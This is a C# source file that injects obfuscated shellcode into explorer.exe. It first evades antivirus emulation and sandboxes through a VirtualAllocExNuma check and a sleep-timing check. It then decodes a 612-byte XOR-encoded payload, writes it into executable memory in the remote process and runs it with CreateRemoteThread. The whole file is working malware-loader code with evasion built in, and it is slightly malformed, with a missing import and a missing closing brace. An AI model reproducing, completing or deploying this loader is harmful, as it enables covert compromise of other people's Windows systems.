using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Net.NetworkInformation;
using System.Text;



namespace ClassLibrary1
{
    public class Class1
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
    uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static void Main(string[] args)
        {

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            Process[] explorer = Process.GetProcessesByName("Explorer");
            if (explorer == null) { Console.WriteLine("Explorer not Found!"); return; }
            var pid = explorer[0].Id;
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            byte[] WxBJtUtC = new byte[612]{0x33, 0xe7, 0xba, 0x1b, 0x0f, 0x07, 0x63, 0x3f, 0x3f, 0x3f, 0xfc, 0xec, 0xfc, 0xef, 0xed, 0xe7, 0xcc, 0x6d, 0xec, 0x98, 0xe7, 0xa2, 0xed, 0x9f, 0xe9, 0xe7, 0xa2, 0xed, 0xd7, 0xe7, 0xa2, 0xed, 0xdf, 0xe7, 0x2e, 0x76, 0xe5, 0xe5, 0xe0, 0xcc, 0x64, 0xe7, 0xa2, 0x8d, 0xef, 0xe7, 0xcc, 0x7f, 0x43, 0xf3, 0x9c, 0xb3, 0x3d, 0xc3, 0xdf, 0xfc, 0x7c, 0x64, 0x20, 0xfc, 0x3c, 0x7c, 0x1d, 0x00, 0xed, 0xfc, 0xec, 0xe7, 0xa2, 0xed, 0xdf, 0xa2, 0xfd, 0xf3, 0xe7, 0x3c, 0x6f, 0x99, 0xbc, 0xb7, 0xd7, 0x22, 0x3d, 0x2e, 0xb8, 0x8d, 0x3f, 0x3f, 0x3f, 0xa2, 0xbf, 0xa7, 0x3f, 0x3f, 0x3f, 0xe7, 0xb8, 0x7f, 0x8b, 0x86, 0xe7, 0x3c, 0x6f, 0xa2, 0xe7, 0xd7, 0xef, 0xfb, 0xa2, 0xff, 0xdf, 0xe4, 0x3c, 0x6f, 0x1a, 0xe9, 0xe0, 0xcc, 0x64, 0xe7, 0x3e, 0x64, 0xfc, 0xa2, 0xcb, 0xa7, 0xe7, 0x3c, 0x69, 0xe7, 0xcc, 0x7f, 0x43, 0xfc, 0x7c, 0x64, 0x20, 0xfc, 0x3c, 0x7c, 0xf7, 0x1f, 0x88, 0x0c, 0xe3, 0x3a, 0xe3, 0xdb, 0x27, 0xf8, 0xf4, 0x6c, 0x88, 0x17, 0x97, 0xfb, 0xa2, 0xff, 0xdb, 0xe4, 0x3c, 0x6f, 0x99, 0xfc, 0xa2, 0x23, 0xe7, 0xfb, 0xa2, 0xff, 0xd3, 0xe4, 0x3c, 0x6f, 0xfc, 0xa2, 0x3b, 0xa7, 0xe7, 0x3c, 0x6f, 0xfc, 0x97, 0xfc, 0x97, 0x91, 0x94, 0x95, 0xfc, 0x97, 0xfc, 0x94, 0xfc, 0x95, 0xe7, 0xba, 0x03, 0xdf, 0xfc, 0xed, 0x3e, 0x1f, 0x97, 0xfc, 0x94, 0x95, 0xe7, 0xa2, 0x2d, 0x04, 0xe2, 0x3e, 0x3e, 0x3e, 0x90, 0xe7, 0xcc, 0x12, 0xea, 0xe4, 0x71, 0xb6, 0x84, 0x81, 0x84, 0x81, 0x98, 0x8b, 0x3f, 0xfc, 0xe9, 0xe7, 0xa4, 0x1c, 0xe4, 0x66, 0x7d, 0xe3, 0xb6, 0xd9, 0x26, 0x3e, 0x68, 0xea, 0xea, 0xe7, 0xa4, 0x1c, 0xea, 0x95, 0xe0, 0xcc, 0x7f, 0xe0, 0xcc, 0x64, 0xea, 0xea, 0xe4, 0x75, 0xf5, 0xe9, 0xb4, 0x46, 0x3f, 0x3f, 0x3f, 0x3f, 0x3e, 0x68, 0x07, 0x2e, 0x3f, 0x3f, 0x3f, 0xcc, 0xf4, 0xcd, 0xc1, 0xcc, 0xc9, 0xf7, 0xc1, 0xcd, 0xc9, 0xc1, 0xcc, 0xca, 0xcd, 0x3f, 0x95, 0xe7, 0xa4, 0x7c, 0xe4, 0x66, 0x7f, 0x72, 0x3c, 0x3f, 0x3f, 0xe0, 0xcc, 0x64, 0xea, 0xea, 0x85, 0x3a, 0xea, 0xe4, 0x75, 0x96, 0xa4, 0x5e, 0x79, 0x3f, 0x3f, 0x3f, 0x3f, 0x3e, 0x68, 0x07, 0xf5, 0x3f, 0x3f, 0x3f, 0xce, 0xf9, 0xe0, 0xb5, 0x96, 0x9e, 0xee, 0x86, 0xe1, 0xb7, 0xe7, 0xf9, 0x8a, 0x89, 0xcd, 0xcd, 0xf4, 0xfa, 0xe1, 0x89, 0xf6, 0xfd, 0xfc, 0x87, 0x85, 0xf7, 0xfa, 0xcd, 0x98, 0xcf, 0xe5, 0x83, 0x99, 0x85, 0xc9, 0xb6, 0x84, 0x87, 0xfc, 0x8a, 0xee, 0xf7, 0xe2, 0x95, 0x87, 0xf7, 0xec, 0x98, 0x83, 0x9e, 0xe0, 0xed, 0xcd, 0xea, 0x81, 0xe6, 0xe9, 0x3f, 0xe7, 0xa4, 0x7c, 0xea, 0x95, 0xfc, 0x97, 0xe0, 0xcc, 0x64, 0xea, 0xe7, 0x77, 0x3f, 0xcd, 0x47, 0xbb, 0x3f, 0x3f, 0x3f, 0x3f, 0xef, 0xea, 0xea, 0xe4, 0x66, 0x7d, 0x02, 0xe8, 0xc1, 0xf2, 0x3e, 0x68, 0xe7, 0xa4, 0x79, 0x85, 0x25, 0x9e, 0xe7, 0xa4, 0x0c, 0x85, 0xde, 0x95, 0xed, 0x87, 0xbf, 0xca, 0x3f, 0x3f, 0xe4, 0xa4, 0x1f, 0x85, 0x3b, 0xfc, 0x94, 0xe4, 0x75, 0x88, 0xf9, 0x51, 0xb9, 0x3f, 0x3f, 0x3f, 0x3f, 0x3e, 0x68, 0xe0, 0xcc, 0x7f, 0xea, 0x95, 0xe7, 0xa4, 0x0c, 0xe0, 0xcc, 0x64, 0xe0, 0xcc, 0x64, 0xea, 0xea, 0xe4, 0x66, 0x7d, 0xc0, 0x39, 0xd7, 0xb2, 0x3e, 0x68, 0xb8, 0x7f, 0x88, 0xde, 0xe7, 0x66, 0x7c, 0xa7, 0x2a, 0x3f, 0x3f, 0xe4, 0x75, 0xfb, 0x0f, 0xc8, 0x1f, 0x3f, 0x3f, 0x3f, 0x3f, 0x3e, 0x68, 0xe7, 0x3e, 0x6e, 0x8b, 0x3d, 0x02, 0x45, 0x07, 0xe8, 0x3f, 0x3f, 0x3f, 0xea, 0x94, 0x85, 0xff, 0x95, 0xe4, 0xa4, 0x6c, 0x7c, 0x1d, 0x2f, 0xe4, 0x66, 0x7f, 0x3f, 0x2f, 0x3f, 0x3f, 0xe4, 0x75, 0x97, 0x5b, 0xea, 0x18, 0x3f, 0x3f, 0x3f, 0x3f, 0x3e, 0x68, 0xe7, 0xaa, 0xea, 0xea, 0xe7, 0xa4, 0x06, 0xe7, 0xa4, 0x0c, 0xe7, 0xa4, 0x15, 0xe4, 0x66, 0x7f, 0x3f, 0xdf, 0x3f, 0x3f, 0xe4, 0xa4, 0x34, 0xe4, 0x75, 0x2d, 0xa9, 0xa4, 0x1d, 0x3f, 0x3f, 0x3f, 0x3f, 0x3e, 0x68, 0xe7, 0xba, 0x7b, 0xdf, 0xb8, 0x7f, 0x8b, 0x4d, 0x99, 0xa2, 0x26, 0xe7, 0x3c, 0x7a, 0xb8, 0x7f, 0x88, 0x6d, 0x97, 0x7a, 0x97, 0x85, 0x3f, 0x94, 0xe4, 0x66, 0x7d, 0x0f, 0x48, 0x5d, 0xe9, 0x3e, 0x68};
            for (int i = 0; i < WxBJtUtC.Length; i++)
            {
                WxBJtUtC[i] = (byte)((((uint)WxBJtUtC[i] ^ 86) -105 ) & 0xFF );
            }
            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, WxBJtUtC, WxBJtUtC.Length, out outSize);
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    }
}